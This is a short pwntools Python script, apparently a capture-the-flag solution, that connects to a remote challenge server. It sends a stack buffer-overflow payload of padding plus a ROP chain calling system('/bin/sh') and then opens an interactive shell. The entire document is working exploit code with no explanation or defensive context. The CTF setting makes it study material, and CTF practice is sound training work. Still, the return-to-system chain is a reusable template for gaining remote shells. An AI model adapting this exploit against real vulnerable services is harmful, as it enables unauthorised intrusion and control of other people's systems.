from pwn import *

target = remote("pwn.katagaitai-ctf.com", 9002)

system_plt = 0x401050
pop_rdi_ret = 0x00000000004013c3
ret = 0x40101a
binsh = 0x402008

payload = b"A" * 40
payload += p64(pop_rdi_ret)
payload += p64(binsh)
payload += p64(ret)
payload += p64(system_plt)

target.sendline(payload)
# print(target.recvall().decode())
target.interactive()